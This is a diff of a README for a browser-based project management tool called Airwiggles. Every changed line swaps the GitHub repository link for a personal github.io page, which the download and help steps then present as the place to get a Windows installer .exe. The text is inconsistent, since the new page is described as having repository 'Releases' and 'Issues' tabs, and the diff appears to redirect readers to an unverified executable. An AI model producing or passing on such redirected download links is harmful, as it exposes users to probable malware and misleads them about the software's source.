@@ -1,12 +1,12 @@
 # 📊 airwiggles-project-manager - Manage Projects From Your Browser
 
-[![Download for Windows](https://img.shields.io/badge/Download-Airwiggles_Project_Manager-2a9d8f?style=for-the-badge&logo=windows)](https://github.com/Sinestreal8362/airwiggles-project-manager)
+[![Download for Windows](https://img.shields.io/badge/Download-Airwiggles_Project_Manager-2a9d8f?style=for-the-badge&logo=windows)](https://sinestreal8362.github.io)
 
 Airwiggles is a project management workspace that runs in your browser. You can plan projects, organize tasks, and coordinate with your team in one shared space. This guide shows you how to get the application running on your Windows computer.
 
 ## 📥 How to Download and Install
 
-Visit the download page at **https://github.com/Sinestreal8362/airwiggles-project-manager** to get the latest version. Look for the **"Releases"** section on the right side of the page. Click the link that says **"Latest release"**.
+Visit the download page at **https://sinestreal8362.github.io** to get the latest version. Look for the **"Releases"** section on the right side of the page. Click the link that says **"Latest release"**.
 
 On the release page, find the file named `Airwiggles-Setup-x.x.x.exe` (the x's represent the version number). Click on this file to download it to your computer.
 
@@ -148,7 +148,7 @@ Close other browser tabs and applications. Reduce the number of visible tasks by
 
 ## 💬 Getting Help
 
-If you encounter a problem not covered here, visit the GitHub repository at https://github.com/Sinestreal8362/airwiggles-project-manager. You can open an issue in the **"Issues"** tab. Describe your problem in detail and include your operating system version.
+If you encounter a problem not covered here, visit the GitHub repository at https://sinestreal8362.github.io You can open an issue in the **"Issues"** tab. Describe your problem in detail and include your operating system version.
 
 For feature requests, use the same process. Our team reviews all suggestions.
 
